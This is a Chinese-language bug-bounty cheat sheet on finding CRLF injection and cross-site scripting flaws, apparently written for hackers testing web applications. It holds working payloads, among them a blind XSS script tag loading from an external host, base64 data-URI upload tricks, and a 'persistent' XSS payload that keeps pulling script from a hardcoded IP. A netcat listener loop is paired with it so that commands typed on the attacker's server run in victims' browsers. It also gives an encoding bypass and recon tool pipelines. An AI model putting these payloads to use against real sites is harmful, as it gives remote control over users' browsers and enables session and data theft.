挖掘技巧
================================


基础
--------------------------------
挖掘此类漏洞，依旧要遵循亘古不变的原则，观察我们的输入“输入“和“输出”位置，对于CRLF则是观察返回的各种类型的协议头.

1、尝试插入 ``<u>test</u>`` , ``<h1>test</h1>`` 等观察是否转义。

2、观察输出是否在返回头中，查看输入，可能是在 **URL值** 和 **参数** 、 **cookie头** 中。在过往的挖掘过程中，最常见的两种情况是使用输入参数创建 Cookie和302跳转location处。

3、提交%0D%0A字符，验证服务器是否响应%0D%0A，若过滤可以通过双重编码绕过。

4、漏洞利用，使杀伤最大化，将漏洞转化为HTML注入，XSS，缓存等。

技巧
--------------------------------
+ 盲存储类XSS
    - payload不会在前端立即触发，而是在后台系统、管理员面板等场景下由其他用户（如管理员）触发。
    - 红线：官方推荐使用 console.log() 来验证漏洞，或者仅允许外带domain信息， ``禁止弹框`` 。
    - payload： ``"><script src=https://me.xss.ht></script>``
+ APK在线分析
    - 对于apk中某些属性的页面显示，可能存在存储型xss的可能。
+ 文件上传型
    - pdf 文件上传XSS:需要google浏览器
    - svg文件上传XSS
    - html文件上传XSS
    - swf文件上传XSS
    - xml文件上传XSS
    - 上传图片
        ::

            如果上传数据是：data:image/png;base64,PGltZyBzcmM9MSBvbmVycm9yPWFsZXJ0KDEpPg==
            可以修改为：data:text/html;base64,PGltZyBzcmM9MSBvbmVycm9yPWFsZXJ0KDEpPg==
+ 反射型XSS持久化
    - payload： ``<script>setInterval(function(){d=document;z=d.createElement("script");z.src="//198.2.235.223:8888";d.body.appendChild(z)},5)</script>``
    - vps上运行： ``while :; do printf "ZephrFishHackerOne>$ "; read c; echo $c | nc -vvlp 8888 >/dev/null; done`` , 如输入 ``alert('x')`` ,客户端就会弹出x。
    - payload的意思是每隔5秒钟就向当前页面的body注入一段script，这个script会向vps发送一个请求，vps上监听8888端口，收到请求后会在控制台打印 ``ZephrFishHackerOne>$``，等待输入命令，输入命令后会发送到客户端执行。
+ 常见场景
    - 在线客服
    - 个人资料修改
    - 评论区
    - 文本编辑器（所有功能）
+ 命令
    - ``echo https://www.example.com/ | gau | gf xss| uro | Gxss | kxss | tee xss_output.txt``
    - ``python loxs.py``